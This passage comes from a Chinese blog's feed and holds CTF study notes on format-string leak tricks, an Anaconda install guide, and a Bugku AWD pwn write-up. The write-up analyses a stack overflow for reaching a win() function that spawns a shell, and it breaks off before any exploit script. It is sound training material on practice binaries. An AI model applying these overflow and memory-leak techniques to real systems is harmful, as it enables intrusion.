function_">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>&#123;<br>  sub_960(a1, a2, a3);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">sub_960</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 buf[<span class="hljs-number">6</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-30h] BYREF</span><br><br>  buf[<span class="hljs-number">5</span>] = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(_bss_start, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">32</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input your Name:&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x30</span>uLL);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello %s:\n&quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)buf);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x60</span>uLL);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230905122100.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230905122112.png" alt="image.png"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="memset"><a href="#memset" class="headerlink" title="memset"></a>memset</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">__int64</span> buf[<span class="hljs-number">6</span>]; <br><span class="hljs-attribute">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">32</span>);<br></code></pre></td></tr></table></figure><p>这段代码声明了一个名为 <code>buf</code> 的数组，该数组的元素类型是 <code>__int64</code>，并且数组的大小为6个 <code>__int64</code> 元素。接着，使用 <code>memset</code> 函数将这个数组的前32个字节都设置为0。这通常用于确保数组的初始状态，以避免包含未初始化的数据。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【ctf题目系列】ctfwiki pwn类型 格式化字符串</title>
    <link href="/2023/09/01/ctf/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91ctfwiki%20pwn%E7%B1%BB%E5%9E%8B%20%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    <url>/2023/09/01/ctf/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91ctfwiki%20pwn%E7%B1%BB%E5%9E%8B%20%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    
    <content type="html"><![CDATA[<p><a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">ctfwiki-格式化字符串-总入口</a></p><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="08x"><a href="#08x" class="headerlink" title="%08x"></a>%08x</h2><p>在C语言中，<code>%08x</code>是一个格式化字符串，通常用于格式化输出或输入十六进制数字。它的含义如下：</p><ul><li><code>%</code>：这是格式化字符串的起始标志。</li><li><code>0</code>：表示使用零填充字段，即在数字前面用零填充，以达到指定的字段宽度。</li><li><code>8</code>：表示字段宽度为8个字符，包括填充的零和十六进制数字。</li><li><code>x</code>：表示以十六进制格式输出整数。</li></ul><p>因此，<code>%08x</code>用于以八个字符的宽度，使用零填充的方式输出一个整数的十六进制表示。如果整数的十六进制表示不足8个字符，将在前面用零填充。这种格式通常用于确保输出的十六进制数具有一致的宽度，便于阅读和比较。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> num = <span class="hljs-number">42</span>; <span class="hljs-comment">// 假设你有一个整数</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%08x&quot;</span>, num); <span class="hljs-comment">// 打印整数num的十六进制表示，确保宽度为8个字符</span><br></code></pre></td></tr></table></figure><p>在这个示例中，<code>num</code>是一个整数变量，<code>printf</code>函数将会将其格式化为一个8个字符宽度的十六进制字符串，并在前面用零填充，然后将结果打印出来。</p><h2 id="printf"><a href="#printf" class="headerlink" title="printf"></a>printf</h2><p>printf(“%p”,a) 用地址的格式打印变量 a 的值<br>printf(“%p”, &amp;a) 打印变量 a 所在的地址。</p><h2 id="3-x"><a href="#3-x" class="headerlink" title="%3$x"></a>%3$x</h2><p>在C语言的格式化字符串中，%3$x表示使用参数列表中的第3个参数，并以十六进制格式打印它。这是一种格式化输出的方式，通常在处理多个参数的情况下使用。</p><ul><li><code>%</code>：格式化字符串的起始标志。</li><li><code>3$</code>：表示使用参数列表中的第3个参数。</li><li><code>x</code>：表示以十六进制格式输出参数的值。</li></ul><p>例如，考虑以下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> a = <span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> b = <span class="hljs-number">20</span>;<br><span class="hljs-type">int</span> c = <span class="hljs-number">30</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%3$x\n&quot;</span>, a, b, c);<br></code></pre></td></tr></table></figure><p>在这个示例中，%3$x将会打印参数列表中的第3个参数 c（它的值是30）的十六进制表示。所以输出将是：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">1e<br></code></pre></td></tr></table></figure><p>请注意，使用%3$x这样的格式化字符串可以很有用，特别是在处理多个参数的情况下，可以选择性地选择要打印的参数，以及以不同的格式打印它们。</p><h2 id="isoc99-scanf-“-6s”-format"><a href="#isoc99-scanf-“-6s”-format" class="headerlink" title="__isoc99_scanf(“%6s”, format);"></a>__isoc99_scanf(“%6s”, format);</h2><p>使用<code>scanf</code>从输入中读取最多6个字符，并将它们存储在名为<code>format</code>的变量中。输入将在读取了6个字符或遇到空白字符（例如空格或换行符）时停止。</p><h2 id="小技巧总结"><a href="#小技巧总结" class="headerlink" title="小技巧总结"></a><strong>小技巧总结</strong></h2><blockquote><ol><li>利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别。</li><li>利用 %s 来获取变量所对应地址的内容，只不过有零截断。</li><li>利用 %order$x 来获取指定参数的值，利用 %order$s 来获取指定参数对应地址的内容。</li></ol></blockquote>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【python系列】(202308) 安装anaconda</title>
    <link href="/2023/08/31/software/%E3%80%90python%E7%B3%BB%E5%88%97%E3%80%91(202308)%20%E5%AE%89%E8%A3%85anaconda/"/>
    <url>/2023/08/31/software/%E3%80%90python%E7%B3%BB%E5%88%97%E3%80%91(202308)%20%E5%AE%89%E8%A3%85anaconda/</url>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># uname -a</span><br>Linux ningan 5.4.0-150-generic <span class="hljs-comment">#167~18.04.1-Ubuntu SMP Wed May 24 00:51:42 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span><br>[root@ningan ~]<span class="hljs-comment">#</span><br>[root@ningan ~]<span class="hljs-comment"># cat /etc/os-release</span><br>NAME=<span class="hljs-string">&quot;Ubuntu&quot;</span><br>VERSION=<span class="hljs-string">&quot;18.04.6 LTS (Bionic Beaver)&quot;</span><br>ID=ubuntu<br>ID_LIKE=debian<br>PRETTY_NAME=<span class="hljs-string">&quot;Ubuntu 18.04.6 LTS&quot;</span><br>VERSION_ID=<span class="hljs-string">&quot;18.04&quot;</span><br>HOME_URL=<span class="hljs-string">&quot;https://www.ubuntu.com/&quot;</span><br>SUPPORT_URL=<span class="hljs-string">&quot;https://help.ubuntu.com/&quot;</span><br>BUG_REPORT_URL=<span class="hljs-string">&quot;https://bugs.launchpad.net/ubuntu/&quot;</span><br>PRIVACY_POLICY_URL=<span class="hljs-string">&quot;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy&quot;</span><br>VERSION_CODENAME=bionic<br>UBUNTU_CODENAME=bionic<br><br></code></pre></td></tr></table></figure><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>Anaconda 安装包可以到 <a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/">https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/</a> 下载。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">我自己的环境下载的是这个：Anaconda3-2021.05-Linux-x86_64.sh<br>最开始下载的是这个：Anaconda3-2023.07-2-Linux-x86_64.sh，安装一直报错<br>下完以后执行：<br><span class="hljs-comment"># bash Anaconda3-2021.05-Linux-x86_64.sh</span><br></code></pre></td></tr></table></figure><p>打开新的bash就能看到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">(base) [root@ningan ~]<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>在ubuntu新<a href="https://so.csdn.net/so/search?q=%E5%AE%89%E8%A3%85anaconda&spm=1001.2101.3001.7020">安装anaconda</a>之后，每次打开终端，总是显示正在使用默认anaconda中的base环境。关闭自动打开的虚拟环境，可以采用如下命令：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">conda<span class="hljs-built_in"> config </span>--<span class="hljs-built_in">set</span> auto_activate_base <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p>下次如果要使用anaconda的<a href="https://so.csdn.net/so/search?q=%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83&spm=1001.2101.3001.7020">虚拟环境</a>，可使用如下命令打开相应的虚拟环境：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">conda activate spacename <span class="hljs-regexp">//</span>环境的名称<br>conda activate base<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>software</category>
      
    </categories>
    
    
    <tags>
      
      <tag>software</tag>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【awd系列】Bugku S3 AWD排位赛-9 pwn类型</title>
    <link href="/2023/08/27/ctf/%E3%80%90awd%E7%B3%BB%E5%88%97%E3%80%91Bugku%20S3%20AWD%E6%8E%92%E4%BD%8D%E8%B5%9B-9%20pwn%E7%B1%BB%E5%9E%8B/"/>
    <url>/2023/08/27/ctf/%E3%80%90awd%E7%B3%BB%E5%88%97%E3%80%91Bugku%20S3%20AWD%E6%8E%92%E4%BD%8D%E8%B5%9B-9%20pwn%E7%B1%BB%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="二进制"><a href="#二进制" class="headerlink" title="二进制"></a>二进制</h1><p>下载地址：<a href="https://download.csdn.net/download/weixin_42072280/88260531">传送门</a></p><h1 id="检查分析"><a href="#检查分析" class="headerlink" title="检查分析"></a>检查分析</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan 3rd]<span class="hljs-comment"># file pwn</span><br>pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="hljs-keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=b1ddcb889cf95991ae5345be73afb83771de5855, not stripped<br>[root@ningan 3rd]<span class="hljs-comment">#</span><br>[root@ningan 3rd]<span class="hljs-comment"># checksec pwn</span><br>[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)<br>[*] <span class="hljs-string">&#x27;/root/ctf/awd/3rd/pwn&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)<br><br></code></pre></td></tr></table></figure><p>可以看到，安全防护还是比较弱的</p><h1 id="运行二进制"><a href="#运行二进制" class="headerlink" title="运行二进制"></a>运行二进制</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan 3rd]<span class="hljs-comment"># ./pwn</span><br>Your goal is to call `win` <span class="hljs-keyword">function</span> (located at 0x400861)<br><br>   [ Address ]           [ Stack ]<br>                   +--------------------+<br>0x00007ffd6f5c6950 | 0x00007f4272c70b40 | &lt;-- buf<br>                   +--------------------+<br>0x00007ffd6f5c6958 | 0x0000000000000000 |<br>                   +--------------------+<br>0x00007ffd6f5c6960 | 0x0000000000000000 |<br>                   +--------------------+<br>0x00007ffd6f5c6968 | 0x00007f4272e8b170 |<br>                   +--------------------+<br>0x00007ffd6f5c6970 | 0x00007ffd6f5c6980 | &lt;-- saved rbp (vuln)<br>                   +--------------------+<br>0x00007ffd6f5c6978 | 0x000000000040084e | &lt;-- <span class="hljs-built_in">return</span> address (vuln)<br>                   +--------------------+<br>0x00007ffd6f5c6980 | 0x0000000000400ad0 | &lt;-- saved rbp (main)<br>                   +--------------------+<br>0x00007ffd6f5c6988 | 0x00007f4272890c87 | &lt;-- <span class="hljs-built_in">return</span> address (main)<br>                   +--------------------+<br>0x00007ffd6f5c6990 | 0x0000000000000001 |<br>                   +--------------------+<br>0x00007ffd6f5c6998 | 0x00007ffd6f5c6a68 |<br>                   +--------------------+<br><br>Input: 123456<br><br>   [ Address ]           [ Stack ]<br>                   +--------------------+<br>0x00007ffd6f5c6950 | 0x000a363534333231 | &lt;-- buf<br>                   +--------------------+<br>0x00007ffd6f5c6958 | 0x0000000000000000 |<br>                   +--------------------+<br>0x00007ffd6f5c6960 | 0x0000000000000000 |<br>                   +--------------------+<br>0x00007ffd6f5c6968 | 0x00007f4272e8b170 |<br>                   +--------------------+<br>0x00007ffd6f5c6970 | 0x00007ffd6f5c6980 | &lt;-- saved rbp (vuln)<br>                   +--------------------+<br>0x00007ffd6f5c6978 | 0x000000000040084e | &lt;-- <span class="hljs-built_in">return</span> address (vuln)<br>                   +--------------------+<br>0x00007ffd6f5c6980 | 0x0000000000400ad0 | &lt;-- saved rbp (main)<br>                   +--------------------+<br>0x00007ffd6f5c6988 | 0x00007f4272890c87 | &lt;-- <span class="hljs-built_in">return</span> address (main)<br>                   +--------------------+<br>0x00007ffd6f5c6990 | 0x0000000000000001 |<br>                   +--------------------+<br>0x00007ffd6f5c6998 | 0x00007ffd6f5c6a68 |<br>                   +--------------------+<br><br>Bye!<br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan 3rd]<span class="hljs-comment"># ./pwn</span><br>Your goal is to call `win` <span class="hljs-keyword">function</span> (located at 0x400861)<br><br>   [ Address ]           [ Stack ]<br>                   +--------------------+<br>0x00007ffe0d6dd760 | 0x00007f02d1bdab40 | &lt;-- buf<br>                   +--------------------+<br>0x00007ffe0d6dd768 | 0x0000000000000000 |<br>                   +--------------------+<br>0x00007ffe0d6dd770 | 0x0000000000000000 |<br>                   +--------------------+<br>0x00007ffe0d6dd778 | 0x00007f02d1df5170 |<br>                   +--------------------+<br>0x00007ffe0d6dd780 | 0x00007ffe0d6dd790 | &lt;-- saved rbp (vuln)<br>                   +--------------------+<br>0x00007ffe0d6dd788 | 0x000000000040084e | &lt;-- <span class="hljs-built_in">return</span> address (vuln)<br>                   +--------------------+<br>0x00007ffe0d6dd790 | 0x0000000000400ad0 | &lt;-- saved rbp (main)<br>                   +--------------------+<br>0x00007ffe0d6dd798 | 0x00007f02d17fac87 | &lt;-- <span class="hljs-built_in">return</span> address (main)<br>                   +--------------------+<br>0x00007ffe0d6dd7a0 | 0x0000000000000001 |<br>                   +--------------------+<br>0x00007ffe0d6dd7a8 | 0x00007ffe0d6dd878 |<br>                   +--------------------+<br><br>Input: aaaaaaaa<br><br>   [ Address ]           [ Stack ]<br>                   +--------------------+<br>0x00007ffe0d6dd760 | 0x6161616161616161 | &lt;-- buf<br>                   +--------------------+<br>0x00007ffe0d6dd768 | 0x000000000000000a |<br>                   +--------------------+<br>0x00007ffe0d6dd770 | 0x0000000000000000 |<br>                   +--------------------+<br>0x00007ffe0d6dd778 | 0x00007f02d1df5170 |<br>                   +--------------------+<br>0x00007ffe0d6dd780 | 0x00007ffe0d6dd790 | &lt;-- saved rbp (vuln)<br>                   +--------------------+<br>0x00007ffe0d6dd788 | 0x000000000040084e | &lt;-- <span class="hljs-built_in">return</span> address (vuln)<br>                   +--------------------+<br>0x00007ffe0d6dd790 | 0x0000000000400ad0 | &lt;-- saved rbp (main)<br>                   +--------------------+<br>0x00007ffe0d6dd798 | 0x00007f02d17fac87 | &lt;-- <span class="hljs-built_in">return</span> address (main)<br>                   +--------------------+<br>0x00007ffe0d6dd7a0 | 0x0000000000000001 |<br>                   +--------------------+<br>0x00007ffe0d6dd7a8 | 0x00007ffe0d6dd878 |<br>                   +--------------------+<br><br>Bye!<br><br></code></pre></td></tr></table></figure><h1 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h1><p>分析main函数，发现有提示：call win函数</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230827220453.png" alt="image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>);<br>  setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Your goal is to call `win` function (located at %p)\n&quot;</span>, win);<br>  vuln();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Bye!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到，读取了一些内容存到了buf变量里，然后就调用了return函数，可以用这个栈溢出漏洞来进行利用</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230827222917.png" alt="image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span><br><br>  _show_stack(buf);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Input: &quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x200</span>uLL);<br>  <span class="hljs-keyword">return</span> _show_stack(buf);<br>&#125;<br></code></pre></td></tr></table></figure><p>查看win函数，看到有system(“&#x2F;bin&#x2F;sh”)的指令，可以直接利用</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230827221057.png" alt="image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __noreturn <span class="hljs-title function_">win</span><span class="hljs-params">()</span><br>&#123;<br>  _QWORD v0[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br><br>  v0[<span class="hljs-number">1</span>] = v0;<br>  <span class="hljs-keyword">if</span> ( ((<span class="hljs-type">unsigned</span> __int8)v0 &amp; <span class="hljs-number">0xF</span>) != <span class="hljs-number">0</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Oops! RSP is misaligned!&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Some functions such as `system` use `movaps` instructions in libc-2.27 and later.&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This instruction fails when RSP is not a multiple of 0x10.&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Find a way to align RSP! You&#x27;re almost there!&quot;</span>);<br>    sleep(<span class="hljs-number">1u</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Congratulations!&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>  &#125;<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>找到system(“&#x2F;bin&#x2F;sh”);的地址为：0x00000000004008C4</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230827221439.png" alt="image.png"></p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sqf">.<span class="hljs-built_in">text</span>:<span class="hljs-number">00000000004008</span>C4 <span class="hljs-number">48</span> <span class="hljs-number">8</span>D <span class="hljs-number">3</span>D C4 <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          lea     rdi, command                    ; <span class="hljs-string">&quot;/bin/sh&quot;</span><br>.<span class="hljs-built_in">text</span>:<span class="hljs-number">00000000004008</span>CB E8 A0 FD FF FF                <span class="hljs-built_in">call</span>    <span class="hljs-variable">_system</span><br></code></pre></td></tr></table></figure><h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>找到填充的间隔为32</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230827223128.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan 3rd]<span class="hljs-comment"># ./pwn</span><br>Your goal is to call `win` <span class="hljs-keyword">function</span> (located at 0x400861)<br><br>   [ Address ]           [ Stack ]<br>                   +--------------------+<br>0x00007ffce7496290 | 0x00007f258a829b40 | &lt;-- buf<br>                   +--------------------+<br>0x00007ffce7496298 | 0x0000000000000000 |<br>                   +--------------------+<br>0x00007ffce74962a0 | 0x0000000000000000 |<br>                   +--------------------+<br>0x00007ffce74962a8 | 0x00007f258aa44170 |<br>                   +--------------------+<br>0x00007ffce74962b0 | 0x00007ffce74962c0 | &lt;-- saved rbp (vuln)<br>                   +--------------------+<br>0x00007ffce74962b8 | 0x000000000040084e | &lt;-- <span class="hljs-built_in">return</span> address (vuln)<br>                   +--------------------+<br>0x00007ffce74962c0 | 0x0000000000400ad0 | &lt;-- saved rbp (main)<br>                   +--------------------+<br>0x00007ffce74962c8 | 0x00007f258a449c87 | &lt;-- <span class="hljs-built_in">return</span> address (main)<br>                   +--------------------+<br>0x00007ffce74962d0 | 0x0000000000000001 |<br>                   +--------------------+<br>0x00007ffce74962d8 | 0x00007ffce74963a8 |<br>                   +--------------------+<br><br>Input: ^C<br>[root@ningan 3rd]<span class="hljs-comment">#</span><br>[root@ningan 3rd]<span class="hljs-comment"># python</span><br>Python 3.6.9 (default, Mar 10 2023, 16:46:00)<br>[GCC 8.4.0] on linux<br>Type <span class="hljs-string">&quot;help&quot;</span>, <span class="hljs-string">&quot;copyright&quot;</span>, <span class="hljs-string">&quot;credits&quot;</span> or <span class="hljs-string">&quot;license&quot;</span> <span class="hljs-keyword">for</span> more 